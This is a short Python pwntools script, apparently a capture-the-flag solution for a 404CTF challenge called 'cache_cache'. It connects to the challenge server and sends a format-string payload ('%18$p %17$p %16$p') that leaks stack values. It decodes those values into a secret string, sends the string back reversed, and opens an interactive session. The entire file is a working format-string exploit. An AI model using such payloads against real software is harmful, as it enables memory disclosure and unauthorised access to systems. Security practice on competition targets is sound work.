#!python3
import sys
from pwn import *

def sp(args):
    sys.stdout.buffer.write(args)


payload = b"AAAABBBB" + b"%18$p" + b" %17$p" + b" %16$p"
sp(payload)

# p = process("./cache_cache")
p = remote("challenge.404ctf.fr", 31946)
p.send(payload+b"\n")

a = p.recvlines(2)[1][18:]

b = a.decode().split(' ')

result = b[0] + b[1][2:] +b[2][2:]
code = bytes.fromhex(result).decode("utf-8")

p.send(code[::-1])
p.interactive()
sp(payload)
